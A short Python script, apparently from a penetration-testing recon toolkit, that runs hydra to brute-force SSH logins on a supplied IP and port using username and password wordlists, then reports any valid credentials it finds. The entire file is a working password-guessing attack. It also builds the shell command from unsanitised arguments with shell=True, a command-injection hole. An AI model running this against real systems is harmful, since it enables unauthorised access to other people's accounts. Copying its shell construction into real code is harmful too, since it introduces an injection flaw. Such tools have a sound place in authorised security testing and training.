#!/usr/bin/env python3
import subprocess
import sys

if len(sys.argv) != 4:
    print("Usage: sshrecon.py <ip address> <port> <log directory>")
    sys.exit(0)

ip_address = sys.argv[1].strip()
port = sys.argv[2].strip()
log_dir = sys.argv[3].strip()

print(f"INFO: Performing hydra ssh scan against {ip_address}")
cmd = f"hydra -L wordlists/userlist -P wordlists/offsecpass -f -o {log_dir}/{ip_address}/{ip_address}_sshhydra.txt ssh://{ip_address}:{port}"
try:
    results = subprocess.run(cmd, shell=True, capture_output=True, text=True, check=True).stdout
    for result in results.splitlines():
        if "login:" in result:
            print(f"[*] Valid ssh credentials found: {result}")
except subprocess.CalledProcessError:
    print("INFO: No valid ssh credentials found")
